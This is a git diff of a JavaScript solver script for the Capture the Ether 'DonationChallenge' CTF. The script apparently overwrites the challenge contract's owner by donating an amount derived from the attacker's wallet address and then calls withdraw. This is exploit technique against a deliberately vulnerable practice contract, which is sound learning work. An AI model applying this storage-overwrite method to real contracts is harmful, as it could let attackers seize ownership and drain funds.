@@ -2,7 +2,7 @@
  * @Author: Soingjeang
  * @Date: 2022-07-25 18:57:14
  * @LastEditors: SoingJeang
- * @LastEditTime: 2022-07-26 13:37:35
+ * @LastEditTime: 2022-07-26 14:57:37
  * @FilePath: \CapTheEther\src\math\3_5_DonationChallenge.js
  */
 /*
@@ -19,26 +19,42 @@ const abiFile = './build/contracts/DonationChallenge.json'; // fill
 const ctfAbi = './build/contracts/DonationChallenge.json'; // fill
 const secrteFile = "../.secret"
 const mnemonicFile = "../iBpnG3uuUwI.csv"
-const ctfaddress = "0xd43d82B5EE19261fDFdcB3c57720799f05a1EF08" // fill
+const ctfaddress = "0xaF49c1C70dA5fAEF1DB2eD63Af721d543Ef8C05A" // fill
 const contractChallangeAddress = "0xaF49c1C70dA5fAEF1DB2eD63Af721d543Ef8C05A" // fill
-const localChallange = "0x2C5A3137680B195e717D30A1001d5ABb7eD859c6" //fill
-const localctf = "0x05D0faF7e1e30C76e0a175BECA000930dCB9f6a6" //fill
+const localChallange = "0xaF49c1C70dA5fAEF1DB2eD63Af721d543Ef8C05A" //fill
+const localctf = "0xaF49c1C70dA5fAEF1DB2eD63Af721d543Ef8C05A" //fill
 
-var localtest = 1  //fill
+var localtest = 0  //fill 
 
 let provider = utils.getNetProvider("3", localtest)
 
 
-async function guess(contractCtf, contractChallenge) {
+async function guess(contractCtf, contractChallenge, wallet) {
     comp = await contractChallenge.isComplete()
     console.log("complete: " + comp)
     if (!comp) {
-        let etherAmount = ethers.BigNumber.from(10)
-        // etherAmount = etherAmount.pow(36)
-        check = await contractCtf.checkDonate(etherAmount)
+        if(localtest){
+            owner = await contractCtf.getOwner()
+            console.log("begin: " + owner)
+            let amalist = ethers.BigNumber.from(owner)
+            console.log("as value: " + amalist)
 
-        console.log("set check: " + check)
-        await utils.sleep(5000)
+            if (owner === wallet.address){
+                console.log("success going to withdraw")
+            }
+        }
+        
+        let amoutString = ethers.BigNumber.from(wallet.address)
+        console.log("my address: " + wallet.address)
+        // this value must equal owner address is going to store
+        let initten = ethers.BigNumber.from(10)
+        let etherDiv = initten.pow(36)
+        let etherAmout = amoutString.mul(1)
+        let etherValue = etherAmout.div(etherDiv)
+        console.log("value: " + etherValue + "  amout: " + etherAmout)
+        
+        // check = await contractCtf.donate(etherAmout, {value:etherValue})
+        withdraw = await contractChallenge.withdraw()
     }
     
     comp = await contractChallenge.isComplete()
@@ -63,7 +79,7 @@ async function doCapture() {
     
     // console.log(contract)
     
-    guess(contrateCtf, contractChall)
+    guess(contrateCtf, contractChall, wallet)
 }
 
 doCapture()
